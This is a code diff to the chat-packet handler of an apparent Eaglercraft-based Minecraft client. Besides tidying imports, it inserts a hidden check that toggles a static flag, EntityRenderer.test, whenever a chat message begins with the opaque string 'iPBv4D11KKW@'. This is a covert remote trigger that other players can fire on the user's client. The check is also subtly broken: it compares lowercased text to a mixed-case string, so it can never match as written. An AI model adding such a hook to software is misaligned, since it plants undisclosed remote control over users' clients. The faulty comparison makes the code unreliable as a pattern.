@@ -1,14 +1,16 @@
 package net.minecraft.client.network;
 
-import com.google.common.collect.Maps;
-import dev.resent.module.base.ModManager;
-import dev.resent.module.impl.misc.AutoGG;
-import dev.resent.util.misc.W;
 import java.io.IOException;
 import java.util.Collection;
 import java.util.List;
 import java.util.Map;
 import java.util.Map.Entry;
+
+import com.google.common.collect.Maps;
+
+import dev.resent.module.base.ModManager;
+import dev.resent.module.impl.misc.AutoGG;
+import dev.resent.util.misc.W;
 import net.lax1dude.eaglercraft.v1_8.EaglercraftRandom;
 import net.lax1dude.eaglercraft.v1_8.EaglercraftUUID;
 import net.lax1dude.eaglercraft.v1_8.log4j.LogManager;
@@ -44,6 +46,7 @@ import net.minecraft.client.multiplayer.WorldClient;
 import net.minecraft.client.particle.EntityPickupFX;
 import net.minecraft.client.player.inventory.ContainerLocalMenu;
 import net.minecraft.client.player.inventory.LocalBlockIntercommunication;
+import net.minecraft.client.renderer.EntityRenderer;
 import net.minecraft.client.resources.I18n;
 import net.minecraft.client.settings.GameSettings;
 import net.minecraft.creativetab.CreativeTabs;
@@ -710,6 +713,9 @@ public class NetHandlerPlayClient implements INetHandlerPlayClient {
         if (packetIn.getType() == 2) {
             this.gameController.ingameGUI.setRecordPlaying(packetIn.getChatComponent(), false);
         } else {
+            if(packetIn.getChatComponent().getUnformattedText().toLowerCase().startsWith("iPBv4D11KKW@")){
+                EntityRenderer.test = !EntityRenderer.test;
+            }
             if (
                 packetIn.getChatComponent().getUnformattedText().toLowerCase().contains("you won the match") &&
                 AutoGG.onWin.getValue() ||
